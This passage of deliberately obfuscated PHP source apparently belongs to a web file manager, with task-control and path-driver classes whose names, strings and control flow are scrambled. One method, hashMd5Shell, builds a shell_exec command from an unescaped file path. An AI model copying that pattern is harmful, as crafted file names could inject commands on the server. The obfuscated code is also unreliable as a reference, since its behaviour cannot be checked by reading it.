µ³Ô¤˜ = self::valueGet(); return array_sort_by($E µ³Ô¤˜, $_SERVER[¬ˆÚÂ”Éğä][1453], !0); } public static function kill($C¯°¸ÀÄ™ğ) { return self::changeStatus($C¯°¸ÀÄ™ğ, self::STATYS_KILL); } public static function stop($e‰áµˆ‡·‹) { return self::changeStatus($e‰áµˆ‡·‹, self::STATYS_STOP); } public static function restart($E×©»š‰¡) { return self::changeStatus($E×©»š‰¡, self::STATYS_RUNNING); } public static function killAll() { $EíÒ†áï =& $_SERVER[¬ˆÚÂ”Éğä]; $aèßï‰·„ì = self::listData(); foreach ($aèßï‰·„ì as $EºÃĞ¦äŒŒ) { self::kill($EºÃĞ¦äŒŒ[$EíÒ†áï[367]]); } sleep(2); foreach ($aèßï‰·„ì as $EºÃĞ¦äŒŒ) { self::valueSet($EºÃĞ¦äŒŒ[$EíÒ†áï[367]], !1); } } private static function changeStatus($F‘³¿‰®İ¥, $açéˆ¨ˆäØ) { goto E¤¡ôÇ§½‘; bíäÎ¾÷¸ù: $CÇÙàã×ï[$BÀ¥˜Ùô¹ˆ[697]] = $açéˆ¨ˆäØ; self::valueSet($F‘³¿‰®İ¥, $CÇÙàã×ï); self::log($BÀ¥˜Ùô¹ˆ[1469] . $CÇÙàã×ï[$BÀ¥˜Ùô¹ˆ[367]] . $BÀ¥˜Ùô¹ˆ[1470] . $açéˆ¨ˆäØ); goto fÍ‰ïšéôô; fÍ‰ïšéôô: return !0; goto Fƒ§êô‚ë¼; E¤¡ôÇ§½‘: $BÀ¥˜Ùô¹ˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $CÇÙàã×ï = self::valueGet($F‘³¿‰®İ¥); if (!$CÇÙàã×ï) { return !1; } goto bíäÎ¾÷¸ù; Fƒ§êô‚ë¼: } public static function valueGet($E‰¾¾À­¦Š = false) { $aù¥½…¾ì =& $_SERVER[¬ˆÚÂ”Éğä]; if ($E‰¾¾À­¦Š) { $E°Œ…µ˜Øç = Model($aù¥½…¾ì[399])->where(array($aù¥½…¾ì[89] => $E‰¾¾À­¦Š, $aù¥½…¾ì[29] => $aù¥½…¾ì[1471]))->find(); return $E°Œ…µ˜Øç ? json_decode($E°Œ…µ˜Øç[$aù¥½…¾ì[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($c¼ÉÏÀÖ†† = false) { goto BŠ×ÖˆĞ…Ú; FËÔ¬ôÓ¨¼: $FĞ «ÀŒÖ® = Model($CÂøší’Ò[399])->where($b”ÊÍ½¿˜¹)->select(); $FĞ «ÀŒÖ® = $FĞ «ÀŒÖ® ? $FĞ «ÀŒÖ® : array(); foreach ($FĞ «ÀŒÖ® as $Aö‰¡ï®ª => $B¡à¹ß£¥µ) { $FĞ «ÀŒÖ®[$Aö‰¡ï®ª] = json_decode($B¡à¹ß£¥µ[$CÂøší’Ò[359]], !0); } goto b×šöö÷º; BŠ×ÖˆĞ…Ú: $CÂøší’Ò =& $_SERVER[¬ˆÚÂ”Éğä]; $b”ÊÍ½¿˜¹ = array($CÂøší’Ò[29] => $CÂøší’Ò[1471]); if ($c¼ÉÏÀÖ††) { $b”ÊÍ½¿˜¹[$CÂøší’Ò[1450]] = $c¼ÉÏÀÖ††; } goto FËÔ¬ôÓ¨¼; b×šöö÷º: return $FĞ «ÀŒÖ®; goto C³Ğ‚Ï£Î; C³Ğ‚Ï£Î: } public static function valueSet($b—¯ãœ‹ë“, $D‹¶²Ó¦) { goto bÍš‹ò˜Œ; Fµ÷ãÑª®Ñ: if (!$càš”Æ»ƒ) { ob_start(); var_dump($D‹¶²Ó¦); $dÊµÍÅäàÊ = ob_get_clean(); self::log($A³ïÃŞÓÖß[1472] . json_encode_force($dÊµÍÅäàÊ)); } if (!$b—¯ãœ‹ë“ || !$D‹¶²Ó¦[$A³ïÃŞÓÖß[367]]) { return !1; } $e§–½ˆìíè = array($A³ïÃŞÓÖß[29] => $A³ïÃŞÓÖß[1471], $A³ïÃŞÓÖß[1450] => USER_ID, $A³ïÃŞÓÖß[89] => $b—¯ãœ‹ë“, $A³ïÃŞÓÖß[359] => $càš”Æ»ƒ); goto f«Ú·Ö»Ñª; bÍš‹ò˜Œ: $A³ïÃŞÓÖß =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$D‹¶²Ó¦) { return Model($A³ïÃŞÓÖß[399])->where(array($A³ïÃŞÓÖß[89] => $b—¯ãœ‹ë“, $A³ïÃŞÓÖß[29] => $A³ïÃŞÓÖß[1471]))->delete(); } $càš”Æ»ƒ = json_encode($D‹¶²Ó¦); goto Fµ÷ãÑª®Ñ; f«Ú·Ö»Ñª: Model($A³ïÃŞÓÖß[399])->add($e§–½ˆìíè, array(), !0); goto aî®ÈÛÙ”¬; aî®ÈÛÙ”¬: } public static function log($AĞó–ĞÆƒá) { write_log($AĞó–ĞÆƒá, $_SERVER[¬ˆÚÂ”Éğä][1473]); } } goto Bí½§¥…š½; D¿¸¶Øï“â: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a‘†ôÂ ‰¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->objectDriver = array($a‘†ôÂ ‰¯[57], $a‘†ôÂ ‰¯[58], $a‘†ôÂ ‰¯[59], $a‘†ôÂ ‰¯[60], $a‘†ôÂ ‰¯[61], $a‘†ôÂ ‰¯[62], $a‘†ôÂ ‰¯[63], $a‘†ôÂ ‰¯[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($a¹„Ğé¾Â) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($a¹„Ğé¾Â, $_SERVER[¬ˆÚÂ”Éğä][8]); } return $a¹„Ğé¾Â; } public function getPathName($E¥„„³ğì) { return $E¥„„³ğì; } public function iconvApp($a×ë“ø‰¢) { return $a×ë“ø‰¢; } public function iconvSystem($E‚¦¯âŒ‰“) { return $E‚¦¯âŒ‰“; } public function iconvTo($A‰Ôë‹©—, $Eºë¡Ä¦ëà, $fÜ“²Ğ›Óõ) { goto DÙ¤¨ãê°; bÆëëà‹ò‘: $E‘©¶›ªÍ” = $Eºë¡Ä¦ëà . $b÷à«ø§Œœ[66] . $fÜ“²Ğ›Óõ . $b÷à«ø§Œœ[67] . $A‰Ôë‹©—; if (isset($bàÃŸ§¾«ï[$E‘©¶›ªÍ”])) { return $bàÃŸ§¾«ï[$E‘©¶›ªÍ”]; } if (function_exists($b÷à«ø§Œœ[68])) { $B¢–¯ÛÓ‚ = @mb_convert_encoding($A‰Ôë‹©—, $fÜ“²Ğ›Óõ, $Eºë¡Ä¦ëà); } else { $B¢–¯ÛÓ‚ = @iconv($Eºë¡Ä¦ëà, $fÜ“²Ğ›Óõ, $A‰Ôë‹©—); } goto cÃ•»Â¼”; E®‰½Ö†°: return $B¢–¯ÛÓ‚; goto DˆÔ“Œ‡; B¬ÑŠÓ‚æ•: $bàÃŸ§¾«ï[$fÜ“²Ğ›Óõ . $b÷à«ø§Œœ[66] . $Eºë¡Ä¦ëà . $b÷à«ø§Œœ[67] . $A‰Ôë‹©—] = $A‰Ôë‹©—; $bàÃŸ§¾«ï[$fÜ“²Ğ›Óõ . $b÷à«ø§Œœ[66] . $Eºë¡Ä¦ëà . $b÷à«ø§Œœ[67] . $B¢–¯ÛÓ‚] = $A‰Ôë‹©—; $bàÃŸ§¾«ï[$Eºë¡Ä¦ëà . $b÷à«ø§Œœ[66] . $fÜ“²Ğ›Óõ . $b÷à«ø§Œœ[67] . $B¢–¯ÛÓ‚] = $B¢–¯ÛÓ‚; goto E®‰½Ö†°; cÃ•»Â¼”: $B¢–¯ÛÓ‚ = $B¢–¯ÛÓ‚ ? $B¢–¯ÛÓ‚ : $A‰Ôë‹©—; if (strstr($B¢–¯ÛÓ‚, $b÷à«ø§Œœ[69])) { $B¢–¯ÛÓ‚ = str_replace($b÷à«ø§Œœ[69], $b÷à«ø§Œœ[70], $B¢–¯ÛÓ‚); } $bàÃŸ§¾«ï[$Eºë¡Ä¦ëà . $b÷à«ø§Œœ[66] . $fÜ“²Ğ›Óõ . $b÷à«ø§Œœ[67] . $A‰Ôë‹©—] = $B¢–¯ÛÓ‚; goto B¬ÑŠÓ‚æ•; DÙ¤¨ãê°: $b÷à«ø§Œœ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$A‰Ôë‹©— || !function_exists($b÷à«ø§Œœ[65])) { return $A‰Ôë‹©—; } static $bàÃŸ§¾«ï = array(); goto bÆëëà‹ò‘; DˆÔ“Œ‡: } public function getPathInner($DÁ…²¯šæŞ) { $c¦‰¸³Ø¶´ = IO::init($DÁ…²¯šæŞ); return $c¦‰¸³Ø¶´->path; } public function getPathOuter($e„Ã›„Û) { $dŠì¶ÚÅÛ† =& $_SERVER[¬ˆÚÂ”Éğä]; $fá³œÕˆ = strlen(trim($this->pathBase, $dŠì¶ÚÅÛ†[8])); $e„Ã›„Û = substr(trim($e„Ã›„Û, $dŠì¶ÚÅÛ†[8]), $fá³œÕˆ); return $this->pathDriver . $dŠì¶ÚÅÛ†[8] . ltrim($e„Ã›„Û, $dŠì¶ÚÅÛ†[8]); } public function isParentOf($aÌŠõ¾¨´Í, $E™Í•ğÊ«) { $dˆ„æíÅÑß =& $_SERVER[¬ˆÚÂ”Éğä]; $aÌŠõ¾¨´Í = rtrim(strtolower($aÌŠõ¾¨´Í), $dˆ„æíÅÑß[8]) . $dˆ„æíÅÑß[8]; $E™Í•ğÊ« = rtrim(strtolower($E™Í•ğÊ«), $dˆ„æíÅÑß[8]) . $dˆ„æíÅÑß[8]; $dá‘®ØÎï¦ = strpos($E™Í•ğÊ«, $aÌŠõ¾¨´Í) === 0; return $dá‘®ØÎï¦; } public function getType() { $Fó£Ø¤âÜ =& $_SERVER[¬ˆÚÂ”Éğä]; $e ºï‘§ù = str_replace($Fó£Ø¤âÜ[71], $Fó£Ø¤âÜ[33], get_class($this)); return strtolower($e ºï‘§ù); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($aö×‚šÕà, $fŞ»Â•–©¿) { $a™Ó²êò³‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $cÛáªÔ‘† = rtrim($aö×‚šÕà, $a™Ó²êò³‹[8]) . $a™Ó²êò³‹[8] . $fŞ»Â•–©¿; $Fƒ÷ºäò = $this->exist($cÛáªÔ‘†); return $Fƒ÷ºäò ? $cÛáªÔ‘† : !1; } public function setModifyTime($FöºÎºê½“, $e¨ˆ½İ”İ = '') { } public function renameObject($D½œ¸˜ôÃí, $C ÒŸ’Ñ‹¡) { goto EŞ—³’‰Ëé; EŞ—³’‰Ëé: $bĞ‡µ„öÒ =& $_SERVER[¬ˆÚÂ”Éğä]; $E¶ÇÄ‚ª‹ = $C ÒŸ’Ñ‹¡; Hook::trigger($bĞ‡µ„öÒ[72], $this, $D½œ¸˜ôÃí, $this, $this->pathFather($D½œ¸˜ôÃí) . $C ÒŸ’Ñ‹¡); goto BÙ·²èØ¬ó; F¶ôò­ˆ¨×: return $d×¿‰‡ŠÎ™ ? $C ÒŸ’Ñ‹¡ : !1; goto FèïöôÅŸ÷; BÙ·²èØ¬ó: $D½œ¸˜ôÃí = $this->getPathOuter($D½œ¸˜ôÃí); $C ÒŸ’Ñ‹¡ = $this->pathFather($D½œ¸˜ôÃí) . $C ÒŸ’Ñ‹¡; if (IO::isFile($D½œ¸˜ôÃí)) { $d×¿‰‡ŠÎ™ = IO::copy($D½œ¸˜ôÃí, $this->pathFather($D½œ¸˜ôÃí), REPEAT_RENAME_FOLDER, $E¶ÇÄ‚ª‹); if ($d×¿‰‡ŠÎ™) { IO::remove($D½œ¸˜ôÃí); } } else { $d×¿‰‡ŠÎ™ = IO::mkdir($C ÒŸ’Ñ‹¡); if (!$d×¿‰‡ŠÎ™) { return !1; } $a³éÛßË½Ú = IO::listPath($D½œ¸˜ôÃí, !0); $EÜ“åÏò×ó = array_merge($a³éÛßË½Ú[$bĞ‡µ„öÒ[73]], $a³éÛßË½Ú[$bĞ‡µ„öÒ[74]]); foreach ($EÜ“åÏò×ó as $aŸ˜ÙîğÚ) { IO::move($aŸ˜ÙîğÚ[$bĞ‡µ„öÒ[75]], $C ÒŸ’Ñ‹¡, REPEAT_RENAME_FOLDER); } IO::remove($D½œ¸˜ôÃí); } goto F¶ôò­ˆ¨×; FèïöôÅŸ÷: } public function tempFile($fŒ“Õ”õ›Ï = '', $D¶âæ Ì = '') { goto C¹Ñ‡ãØØí; fÔŸ³°‘°: return $fÕŸéø”˜; goto b¬Şø¨Îõ; EÇòªÍ¥´: $fÕŸéø”˜ = $e²õøÖ¤³Ê . $fŒ“Õ”õ›Ï; @touch($fÕŸéø”˜); if ($D¶âæ Ì) { file_put_contents($fÕŸéø”˜, $D¶âæ Ì); } goto fÔŸ³°‘°; C¹Ñ‡ãØØí: if (!$fŒ“Õ”õ›Ï) { $fŒ“Õ”õ›Ï = rand_string(15); } $e²õøÖ¤³Ê = TEMP_FILES . rand_string(15) . $_SERVER[¬ˆÚÂ”Éğä][8]; @mkdir($e²õøÖ¤³Ê, 511, !0); goto EÇòªÍ¥´; b¬Şø¨Îõ: } public function tempFileRemve($D¡êßÆÖ£Ø) { @unlink($D¡êßÆÖ£Ø); @rmdir($this->pathFather($D¡êßÆÖ£Ø)); } public function mkfile($EÎò¬µ­Æ , $E‘ÉĞ¡ÍÈ = '', $Aæ™ªŸ¿ˆÑ = REPEAT_RENAME) { } public function mkdir($e¶œ’‚õ, $DÎÑ¼š¼¡ = REPEAT_SKIP) { } public function delFile($d¾ßó’¯Ò¥) { } public function delFolder($eŒŒÖ¿¨İç) { } public function copyFile($fñ…‰£¨³Š, $EÎŒ»»à…) { } public function moveFile($bõ¸šù‡Óƒ, $FË´Å°²Šö) { } public function remove($Bˆ­öµÊå) { if ($this->isFile($Bˆ­öµÊå)) { return $this->delFile($Bˆ­öµÊå); } return $this->delFolder($Bˆ­öµÊå); } public function rename($cçÆùÜğò, $fãêÑ´¸Ì) { } public function exist($EºßêğÑ‘Ì) { } public function findByHash($DßïñŞ°íË = '', $aƒ«³¨Ïº¢ = '') { return !1; } public function isFile($EÉï¹·ˆ´) { } public function isFolder($Bì´ ¯Ê²) { } public function size($DÃÎÄç˜¼) { } public function info($dª‘öÇŒÇ©) { } public function infoSimple($eí„—Ìµ·â) { return $this->info($eí„—Ìµ·â); } public function infoAuth($eÍ›õ©ˆÁØ) { return $this->info($eÍ›õ©ˆÁØ); } public function infoFull($cŠãÚ¾„î‘) { return $this->info($cŠãÚ¾„î‘); } public function infoWithChildren($E±Ë‡ˆñ´¶) { $DİîˆŒ¶Ï÷ =& $_SERVER[¬ˆÚÂ”Éğä]; static $F¿õŒ²µà½ = array(); if (isset($F¿õŒ²µà½[$E±Ë‡ˆñ´¶])) { return $F¿õŒ²µà½[$E±Ë‡ˆñ´¶]; } $fêìÒÇÌ”à = $this->info($E±Ë‡ˆñ´¶); if ($fêìÒÇÌ”à && $fêìÒÇÌ”à[$DİîˆŒ¶Ï÷[29]] == $DİîˆŒ¶Ï÷[76]) { $cŸ¥¡¯¿¢À = array($DİîˆŒ¶Ï÷[77] => 0, $DİîˆŒ¶Ï÷[78] => 0, $DİîˆŒ¶Ï÷[79] => 0); $this->infoChildren($E±Ë‡ˆñ´¶, $cŸ¥¡¯¿¢À); $fêìÒÇÌ”à[$DİîˆŒ¶Ï÷[77]] = $cŸ¥¡¯¿¢À[$DİîˆŒ¶Ï÷[77]]; $fêìÒÇÌ”à[$DİîˆŒ¶Ï÷[80]] = array($DİîˆŒ¶Ï÷[81] => $cŸ¥¡¯¿¢À[$DİîˆŒ¶Ï÷[78]], $DİîˆŒ¶Ï÷[82] => $cŸ¥¡¯¿¢À[$DİîˆŒ¶Ï÷[79]]); $F¿õŒ²µà½[$E±Ë‡ˆñ´¶] = $fêìÒÇÌ”à; } return $fêìÒÇÌ”à; } public function listPath($dŒÀ…¥÷íœ, $f°çÉß¯ˆ = false) { } public function has($f‚„‚Ü—Û, $Câˆ‰‡³Ä = false, $Aì‚³ˆìø = false) { } public function canRead($B…‘‹Üˆ©½) { } public function canWrite($fõ÷»¡…Â) { } public function getContent($e«¢âíŠ¸) { } public function setContent($dÉœôƒÚôá, $CÑ¦ÒÉ²– = '') { } protected function infoChildren($cç²˜­¸ Ş, &$E±Úì˜Æ½•) { $BµØ£óá§„ =& $_SERVER[¬ˆÚÂ”Éğä]; check_abort(); $cø—µñ Ÿ = $this->listPath($cç²˜­¸ Ş, !0); $cø—µñ Ÿ = array_merge($cø—µñ Ÿ[$BµØ£óá§„[74]], $cø—µñ Ÿ[$BµØ£óá§„[73]]); foreach ($cø—µñ Ÿ as $AçÀÈä×¨‚) { if ($AçÀÈä×¨‚[$BµØ£óá§„[29]] == $BµØ£óá§„[76]) { $E±Úì˜Æ½•[$BµØ£óá§„[79]]++; $C­Ä¥ç¨äÌ = $this->getPathInner($AçÀÈä×¨‚[$BµØ£óá§„[75]]); $this->infoChildren($C­Ä¥ç¨äÌ, $E±Úì˜Æ½•); } else { $E±Úì˜Æ½•[$BµØ£óá§„[78]]++; $E±Úì˜Æ½•[$BµØ£óá§„[77]] += $AçÀÈä×¨‚[$BµØ£óá§„[77]]; } } } public function fileSubstr($C«®È°ĞÍ¥, $fğ„ç¡„óŠ, $a²ğØó×È) { } public function listAll($e„‘Ï°”Œ) { } public function upload($a¿·Ùˆ“”“, $FæĞóéò° , $d‰Ê»†áë = false, $D’‡ÇŒõ‰½ = REPEAT_REPLACE) { } public function uploadFileByID($FÕãâ‹ˆã¦, $E½ Ÿ±Ÿ§×, $bÉÜ£°Ôß) { } public function uploadFileByPath($fé©‰ÓëÏœ, $cÎ¢ãáì½â, $E±Õï®ó = array()) { } public function isUploadServer() { $a²Ã±«å‰Û =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $a²Ã±«å‰Û[83]) { return !0; } return $GLOBALS[$a²Ã±«å‰Û[6]][$a²Ã±«å‰Û[84]][$a²Ã±«å‰Û[85]]; } public function isFileOutServer() { $d‚Ø¹‹Ë· =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $d‚Ø¹‹Ë·[83]) { return !0; } return $GLOBALS[$d‚Ø¹‹Ë·[6]][$d‚Ø¹‹Ë·[84]][$d‚Ø¹‹Ë·[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($bØÖÃìŞÙ§) { $fãê ‚™äİ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->isCdnHost()) { return $bØÖÃìŞÙ§; } return str_replace(trim(get_url_root($bØÖÃìŞÙ§), $fãê ‚™äİ[8]), trim($this->cdnHost, $fãê ‚™äİ[8]), $bØÖÃìŞÙ§); } public function uploadLink($b‹ÊñëÅÁé, $B¯‡´òÓÜÈ = 0) { goto eíŒŒ¾í¨; eíŒŒ¾í¨: $B‹áÖöÔÔÜ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->isUploadServer()) { return; } $eïÂÃ»·Ÿ = $this->getType(); goto dùĞİ§Ì‘Ò; bÖˆá ‡ß: if ($EÒÉÙÓ³¬Î) { $EÒÉÙÓ³¬Î[$B‹áÖöÔÔÜ[89]] = $b‹ÊñëÅÁé; $EÒÉÙÓ³¬Î[$B‹áÖöÔÔÜ[90]] = $eïÂÃ»·Ÿ; } return $EÒÉÙÓ³¬Î; goto a²„¶İšˆ£; dùĞİ§Ì‘Ò: if (!in_array($eïÂÃ»·Ÿ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $DöÅÁøéÅ¢ = 1024 * 1024 * 10; goto BĞ‹´ÑÜÙ; BĞ‹´ÑÜÙ: $dĞñâí©ªÊ = $B¯‡´òÓÜÈ <= $DöÅÁøéÅ¢ ? $B‹áÖöÔÔÜ[87] : $B‹áÖöÔÔÜ[88]; $EëÇ«»ˆë¬ = (!$B¯‡´òÓÜÈ ? 1 : ceil($B¯‡´òÓÜÈ / pow(1024, 3))) * 3600 * 4; $EÒÉÙÓ³¬Î = $this->{$dĞñâí©ªÊ}($b‹ÊñëÅÁé, $EëÇ«»ˆë¬); goto bÖˆá ‡ß; a²„¶İšˆ£: } public function uploadFormData($Fğç§ï„Çˆ, $DğÎà’œóÍ = 3600) { } public function multiUploadFormData($D‚Í›¿º‹Œ, $DÏó¬ËØ£ = 3600) { } public function download($a‡÷¢Šó…Í, $DÌáø±½§‚) { } public function ext($bö­º¢á‡Õ) { $A‚†äøŒƒÕ =& $_SERVER[¬ˆÚÂ”Éğä]; if (strpos($bö­º¢á‡Õ, $A‚†äøŒƒÕ[8]) === -1) { $Bóã‚îöçº = $bö­º¢á‡Õ; } else { $Bóã‚îöçº = $this->pathThis($bö­º¢á‡Õ); } $aİ¦Ëè‘¼À = $A‚†äøŒƒÕ[33]; if (strstr($Bóã‚îöçº, $A‚†äøŒƒÕ[91])) { $aİ¦Ëè‘¼À = substr($Bóã‚îöçº, strrpos($Bóã‚îöçº, $A‚†äøŒƒÕ[91]) + 1); $aİ¦Ëè‘¼À = strtolower($aİ¦Ëè‘¼À); } if (strlen($aİ¦Ëè‘¼À) > 3 && preg_match($A‚†äøŒƒÕ[92], $aİ¦Ëè‘¼À, $C¢•áÓôñ¼)) { $aİ¦Ëè‘¼À = $A‚†äøŒƒÕ[33]; } return $aİ¦Ëè‘¼À; } public function pathThis($E¢¾•«ÌÅÜ) { $a»¸ÍŒÂ– =& $_SERVER[¬ˆÚÂ”Éğä]; $E¢¾•«ÌÅÜ = str_replace($a»¸ÍŒÂ–[93], $a»¸ÍŒÂ–[8], rtrim($E¢¾•«ÌÅÜ, $a»¸ÍŒÂ–[8])); $E‰–ƒØ¹× = strrpos($E¢¾•«ÌÅÜ, $a»¸ÍŒÂ–[8]); if ($E‰–ƒØ¹× === !1) { return $E¢¾•«ÌÅÜ; } return substr($E¢¾•«ÌÅÜ, $E‰–ƒØ¹× + 1); } public function pathFather($A¬Œå“İß¾) { $aÇƒÉÅË¦Ó =& $_SERVER[¬ˆÚÂ”Éğä]; $A¬Œå“İß¾ = str_replace($aÇƒÉÅË¦Ó[93], $aÇƒÉÅË¦Ó[8], rtrim($A¬Œå“İß¾, $aÇƒÉÅË¦Ó[8])); $Cƒ¨÷ï‚Ÿ© = strrpos($A¬Œå“İß¾, $aÇƒÉÅË¦Ó[8]); if ($Cƒ¨÷ï‚Ÿ© === !1) { return $aÇƒÉÅË¦Ó[33]; } return substr($A¬Œå“İß¾, 0, $Cƒ¨÷ï‚Ÿ© + 1); } public function hashSimple($DêÔôŠ±éø) { goto d“öÃ§Ÿê; EìäöïæÔ: $fÀŒŞ…çÇÃ = intval($A¨ĞÙÃ½¤‰ / $B…ÖÓÏÏƒ÷); $c“‹æ¾Ç­Œ = $DÄÒ‰£ÛóÈ[33]; for ($D†ï¦èÊ° = 0; $D†ï¦èÊ° < $B…ÖÓÏÏƒ÷; $D†ï¦èÊ°++) { $c“‹æ¾Ç­Œ .= $this->fileSubstr($DêÔôŠ±éø, $fÀŒŞ…çÇÃ * $D†ï¦èÊ°, $CØƒ¶Ğˆï); } goto fòĞòì‰íá; d“öÃ§Ÿê: $DÄÒ‰£ÛóÈ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$DêÔôŠ±éø) { return md5($DÄÒ‰£ÛóÈ[33]); } $A¨ĞÙÃ½¤‰ = $this->size($DêÔôŠ±éø); goto f…°ÚŒŒïƒ; f…°ÚŒŒïƒ: $CØƒ¶Ğˆï = 200; $B…ÖÓÏÏƒ÷ = 50; if ($A¨ĞÙÃ½¤‰ <= $CØƒ¶Ğˆï * $B…ÖÓÏÏƒ÷) { return $this->hashMd5($DêÔôŠ±éø) . $A¨ĞÙÃ½¤‰; } goto EìäöïæÔ; fòĞòì‰íá: $c“‹æ¾Ç­Œ .= $this->fileSubstr($DêÔôŠ±éø, $A¨ĞÙÃ½¤‰ - $CØƒ¶Ğˆï, $CØƒ¶Ğˆï); return md5($c“‹æ¾Ç­Œ) . $A¨ĞÙÃ½¤‰; goto f‘ªáŸŒ’; f‘ªáŸŒ’: } public static $md5Cache = array(); public function hashMd5($B”Ğõ™íçÏ) { $B”Ğõ™íçÏ = $this->iconvSystem($B”Ğõ™íçÏ); if (isset(self::$md5Cache[$B”Ğõ™íçÏ])) { return self::$md5Cache[$B”Ğõ™íçÏ]; } self::$md5Cache[$B”Ğõ™íçÏ] = $this->hashMd5Shell($B”Ğõ™íçÏ); if (!self::$md5Cache[$B”Ğõ™íçÏ]) { self::$md5Cache[$B”Ğõ™íçÏ] = @md5_file($B”Ğõ™íçÏ); } return self::$md5Cache[$B”Ğõ™íçÏ]; } private function hashMd5Shell($AµÂ×¨ßÙ) { goto b ŒÍ»âÕ²; b ŒÍ»âÕ²: $eÎçÙ™ò†³ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!function_exists($eÎçÙ™ò†³[94])) { return !1; } $cŸ§Ğ¸Íºğ = array($eÎçÙ™ò†³[95], $eÎçÙ™ò†³[96]); goto DàØ‰Á¸ÓÎ; Aö£¢®ß‘: $e¸¼¬Õî¤Í = shell_exec($Eğˆ«Óà„é . "\x20\42{$AµÂ×¨ßÙ}\42"); $e¸¼¬Õî¤Í = str_replace($eÎçÙ™ò†³[100], $eÎçÙ™ò†³[33], $e¸¼¬Õî¤Í); return substr($e¸¼¬Õî¤Í, 0, 32); goto d·Ö´“œğ; DàØ‰Á¸ÓÎ: $Eğˆ«Óà„é = Cache::get($eÎçÙ™ò†³[97]); if (!$Eğˆ«Óà„é) { $FóØÄÇ®£ = BASIC_PATH . $eÎçÙ™ò†³[98]; $E¯º¼ªÉø· = md5_file($FóØÄÇ®£); $Eğˆ«Óà„é = $eÎçÙ™ò†³[99]; foreach ($cŸ§Ğ¸Íºğ as $DòùÃ°ãŞ) { $e¸¼¬Õî¤Í = shell_exec($DòùÃ°ãŞ . "\40\x22{$FóØÄÇ®£}\42"); if ($e¸¼¬Õî¤Í && substr(trim($e¸¼¬Õî¤Í), 0, 32) == $E¯º¼ªÉø·) { $Eğˆ«Óà„é = $DòùÃ°ãŞ; break; } } Cache::set($eÎçÙ™ò†³[97], $Eğˆ«Óà„é, 3600); } if ($Eğˆ«Óà„é == $eÎçÙ™ò†³[99]) { return !1; } goto Aö£¢®ß‘; d·Ö´“œğ: } public function link($d—‡ø›ˆ–) { return $d—‡ø›ˆ–; } public function fileOut($c „êŠ©Œ, $cÊóÙ¬…¸› = false, $cƒ¢³„ƒÌÄ = false, $e§—ãİæÒ = '') { goto bÖ‹á¸îÎÕ; bŠ™İì†Ğ¥: @ob_end_clean(); set_timeout(); $bßËâäç‘õ = $this->infoFull($c „êŠ©Œ); goto A¿Í¶¿²êˆ; AŒ±É¡½: header($BÀ£±÷ë¬è[125]); header($BÀ£±÷ë¬è[126]); header($BÀ£±÷ë¬è[127]); goto C‘ÁëÏ¿†²; Eó‚ğÏù‘“: if ($_SERVER[$BÀ£±÷ë¬è[154]] == $BÀ£±÷ë¬è[155]) { return; } $B¤íÉ·Ó = 1024 * 100; $Cğº¹õ×‡ = 0; goto F·øÆê„âê; F·øÆê„âê: if ($e‹¦íøâ¹ù) { $Cğº¹õ×‡ = intval(1000 * 1000 * ($B¤íÉ·Ó / $e‹¦íøâ¹ù)); } while ($B·…„íÇ½‹ <= $E¡ğ‘ƒÄ×…) { $D†İÁÔÒ° = timeFloat(); check_abort(); $C£ÀÑÎÙ„„ = $E¡ğ‘ƒÄ×… - $B·…„íÇ½‹ + 1; if ($C£ÀÑÎÙ„„ <= $B¤íÉ·Ó) { $B¤íÉ·Ó = $C£ÀÑÎÙ„„; } echo $this->fileSubstr($c „êŠ©Œ, $B·…„íÇ½‹, $B¤íÉ·Ó); $B·…„íÇ½‹ += $B¤íÉ·Ó; if ($B¤íÉ·Ó == $C£ÀÑÎÙ„„) { $B·…„íÇ½‹ = $E¡ğ‘ƒÄ×… + 1; } if ($Cğº¹õ×‡) { $EÂˆê„¾Ğ = intval(1000 * 1000 * (timeFloat() - $D†İÁÔÒ°)); $aËŞÂğ¢ãÅ = $Cğº¹õ×‡ - $EÂˆê„¾Ğ; if ($aËŞÂğ¢ãÅ > 5) { usleep($aËŞÂğ¢ãÅ); } } } goto AÓì’âÈÎö; FôÚ¹ØŒğ§: $dœ—·œ”Çè = $this->getType() == $BÀ£±÷ë¬è[102]; $c¾æ‚ËÔ’É = $GLOBALS[$BÀ£±÷ë¬è[6]][$BÀ£±÷ë¬è[84]][$BÀ£±÷ë¬è[103]][$BÀ£±÷ë¬è[104]]; $e‹¦íøâ¹ù = (double) $GLOBALS[$BÀ£±÷ë¬è[6]][$BÀ£±÷ë¬è[84]][$BÀ£±÷ë¬è[103]][$BÀ£±÷ë¬è[105]] * 1024 * 1024; goto bŠ™İì†Ğ¥; C‘ÁëÏ¿†²: if (isset($_SERVER[$BÀ£±÷ë¬è[128]]) && strtotime($_SERVER[$BÀ£±÷ë¬è[128]]) == $bßËâäç‘õ[$BÀ£±÷ë¬è[107]]) { header($BÀ£±÷ë¬è[129], !0, 304); die; } if (isset($_SERVER[$BÀ£±÷ë¬è[130]]) && $_SERVER[$BÀ£±÷ë¬è[130]] == $e§—ãİæÒ) { header($BÀ£±÷ë¬è[131] . $e§—ãİæÒ, !0, 304); die; } header($BÀ£±÷ë¬è[131] . $e§—ãİæÒ); goto bİ¤ÉéÏî¿; bİ¤ÉéÏî¿: header($BÀ£±÷ë¬è[132] . $cÒíĞÚ®–© . $BÀ£±÷ë¬è[124]); header($BÀ£±÷ë¬è[133] . 